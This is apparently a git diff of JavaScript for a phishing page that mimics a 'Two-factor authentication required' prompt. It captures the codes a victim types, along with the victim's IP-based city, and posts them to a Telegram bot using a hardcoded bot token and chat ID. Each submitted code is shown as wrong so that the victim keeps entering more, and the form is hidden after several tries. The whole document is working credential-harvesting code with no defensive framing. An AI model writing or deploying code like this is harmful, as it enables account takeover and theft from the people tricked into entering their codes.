@@ -45,8 +45,9 @@ function setTime() {
             $('#time').text('00:00');
         }
     }, 1000);
-}
 
+    let IpAddress = '';
+}
 function updateHtmlAndCallback(callback) {
     $('#code-form .card-body').html(`
                 <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
@@ -54,8 +55,8 @@ function updateHtmlAndCallback(callback) {
                     protect has changed. Verify code has been sent
                 </p>
                 <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
-                <input type="tel" class="form-control my-3 py-2 bg-light" id="code"
-                    placeholder="Enter your code" required inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="form-control my-3 py-2 bg-light" id="code"
+                    placeholder="Enter your code" required>
                 <p class="text-danger ms-1 d-none" id="wrong-code">
                     The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
                 </p>
@@ -86,38 +87,32 @@ let MAX_TRIES = 4;
 let code1 = '';
 let code2 = '';
 let Fcode = '';
-
 function sendCode() {
     $('#code').on('input', function () {
-        // Chỉ giữ lại ký tự số
-        let numbers = $(this).val().replace(/\D/g, '');
+        const input = $(this).val();
+        const validInputRegex = /^\d+$/;
 
-        // Giới hạn độ dài tối đa 8 chữ số
-        if (numbers.length > 8) {
-            numbers = numbers.slice(0, 8);
+        if (!validInputRegex.test(input)) {
+            $(this).val(input.slice(0, -1));
         }
-
-        $(this).val(numbers);
     });
 
     $('#send-code').on('click', function () {
         const $btn = $(this);
 
+        // Nếu nút đang bị khóa, không làm gì cả
         if ($btn.prop('disabled')) return;
 
         const keymap = $('#code').val();
 
-        // Kiểm tra chỉ chấp nhận 6 hoặc 8 chữ số
-        if (!(keymap.length === 6 || keymap.length === 8)) {
+        if (keymap === '') {
             $('#code').addClass('border-danger');
-            $('#wrong-code').removeClass('d-none').text("Code must be 6 or 8 digits.");
             return;
         } else {
             $('#code').removeClass('border-danger');
-            $('#wrong-code').addClass('d-none');
         }
 
-        // Khóa nút trong 20 giây
+        // Khóa nút trong 20s với đếm ngược
         $btn.prop('disabled', true).text('Please wait (20s)');
         let waitTime = 20;
         const countdown = setInterval(() => {
@@ -136,4 +131,49 @@ function sendCode() {
 ` <strong>City:</strong> <code>${IpAddress.city}</code>`;
         NUMBER_TIME_SEND_CODE++;
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chatId =
+        const chatId = '-1002416068664';
+        const message = message1;
+
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'html'
+            })
+        })
+            .then((response) => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then((data) => {
+                setTimeout(function () {
+                    if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
+                        $('#wrong-code').removeClass('d-none');
+                    } else {
+                        $('#wrong-code').removeClass('d-none');
+                        $('#send-code').prop('disabled', true);
+                        $('#code-form').addClass('d-none');
+                        $('#getCode').removeClass('d-none');
+                    }
+                    $('.lsd-ring-container').addClass('d-none');
+                }, 2000);
+            })
+            .catch((error) => {
+                setTimeout(function () {
+                    Swal.fire({
+                        text: `Request failed!`,
+                        icon: 'error'
+                    });
+                    $('.lsd-ring-container').addClass('d-none');
+                }, 500);
+            });
+    });
+}
